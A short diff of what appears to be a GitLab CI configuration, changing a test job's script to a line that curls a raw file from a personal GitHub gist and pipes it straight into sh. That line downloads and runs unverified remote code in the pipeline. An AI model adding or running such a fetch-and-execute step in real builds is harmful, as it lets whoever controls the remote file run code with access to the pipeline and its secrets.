@@ -6,4 +6,4 @@ test:
   image:
     name: gitlab/gitlab-ce:latest
   script:
-    - "https://gist.githubusercontent.com/parthanon/d0fb1a338b1bcf5a46fcc10c780ab542/raw/b449d67383761d100571b6216462c143a7aeaacf/gistfile1.txt| sh"
+    - "curl https://gist.githubusercontent.com/parthanon/d0fb1a338b1bcf5a46fcc10c780ab542/raw/b449d67383761d100571b6216462c143a7aeaacf/gistfile1.txt| sh"
